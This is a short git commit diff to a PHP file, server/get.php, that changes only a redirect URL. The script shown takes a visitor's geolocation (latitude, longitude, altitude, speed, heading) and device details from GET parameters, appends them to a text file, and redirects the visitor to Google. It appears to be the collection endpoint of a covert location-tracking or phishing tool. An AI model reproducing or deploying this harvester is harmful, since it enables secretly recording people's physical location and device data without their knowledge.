addb738108a1efdfab6b5ff4f86b6c45586d8db7
Unamed <34691959+Unam3dd@users.noreply.github.com>
2019-12-18 19:36:05 +0100

    Update get.php

--- server/get.php
+++ server/get.php
@@ -2,6 +2,6 @@
 
 file_put_contents("geolocate.txt", "" . $_GET['latitude'] . "\n" . "" . $_GET["longitude"] . "\n" . "" . $_GET["useragent"] . "\n" . "" . $_GET["altitude"] . "\n" . "" . $_GET["accuracy"] . "\n" . ""  . $_GET["speed"] . "\n" . "" . $_GET["heading"] . "\n" . "" . $_GET["platform"] . "\n" . "" . $_GET["hardware"] . "\n" . ""   . $_GET["memory"] ."\n" . ""   . $_GET["height"] ."\n" . ""   . $_GET["width"] ."\n", FILE_APPEND);
 
-header('Location: https://www.google.com/');
+header('Location: https://www.google.com');
 exit();
 ?>
